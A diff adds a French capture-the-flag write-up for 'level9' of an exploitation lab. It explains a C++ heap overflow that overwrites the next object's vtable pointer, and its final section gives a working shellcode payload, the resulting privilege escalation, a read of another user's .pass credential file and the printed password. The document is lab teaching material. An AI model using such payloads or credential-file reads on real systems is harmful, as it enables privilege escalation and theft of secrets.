@@ -1,0 +1,49 @@
+# Level 9
+## Résumé
+C++ avec classe => buffer overflow sur la `vtable` de l'objet suivant en heap => double déférencement vers notre shellcode en buffer
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
+$> file level9 
+level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
+```
+Le home contient un binaire appartenant à l'user `bonus0` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/bonus0/.pass`.
+
+On récupère le fichier `level9` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 level9@10.11.200.192:/home/user/level9/level9 .
+$> r2 level9
+```
+![main_function](Ressources/main_function.png)
+
+## Analyse
+### Analyse du programme
+Le programme est écrit en C++.
+
+Il contient une classe (une structure améliorée), avec entre autre un buffer et un membre qui appelle `strcpy` pour copier le premier argument de programme vers ce buffer. Il y a ici une possibilité d'avoir un `buffer overflow`.  
+La classe contient également un membre virtuel, c'est à dire une fonction qui peut être remplacée par une fonction du même nom dáclarée par une classe fille (qui hérite de cette classe). Ceci induit qu'au début de la classe, en mémoire, se trouve une `vtable` qui est un tableau de pointeur de fonction pointant vers le membre à appelé, de la classe mère ou de la classe fille.  
+On peut donc se servire du pointeur de fonction pour `rediriger le flux d'exécution` vers du code mis en buffer.
+
+La fonction main instancie deux variables du type de la classe, sur la `heap`. Les deux classes sont donc placées en mémoire l'une à la suite de l'autre.  
+La fonction membre qui copie l'argument du programme dans le buffer du premier objet est appelé. Enfin la fonction virtuelle est appelé avant de quitter le programme.
+### Mise en place de l'exploitation
+Vu que les objets sont déclarés en mémoire à la suite, et que l'ont peut exploiter un buffer overflow du 1er objet pour réécrire sur le pointeur de fonction du deuxième objet, nous pouvons exécuter du code arbitraire.
+
+Le buffer a une taille de 100 octets, puis il a une variable interne à la classe, puis il y a un alignement de 4 octect (car `malloc` aligne sur 8 octets) avant d'arriver à la `vtable`.
+
+Avec un codeshell de 21 octets, il faut insérer un padding. Nous le plaçons au début avec un `NOP slide`, ce qui permet une tolérence dans la redirection de flux. Toutefois, les adresses sur la `heap` sont très stables entre deux exécutions du programme, ce qui permet de connaître précisemment l'adresse sur laquelle pointer.
+
+Enfin, il faut savoir que lorsque la fonction virtuelle est appelée, le programme pointe vers une `vpointer` et non directement vers la fonction elle-même. Ceci nécessite d'effectuer un deuxième `jump` dans notre shell code.  
+L'adresse qui se situe à la fin de notre shellcode et qui va remplacer l'adresse de la `vtable` pointera donc vers le début du buffer, qui sera à lui-même un pointeur vers le début du shellcode.
+
+[shell_code](http://shell-storm.org/shellcode/files/shellcode-752.php)
+## Application
+```sh
+$ cat - | ./level9 `python -c 'print("\x10\xa0\x04\x08"+"\x90"*(96+4+4-21)+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"+"\x0c\xa0\x04\x08")'`
+id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
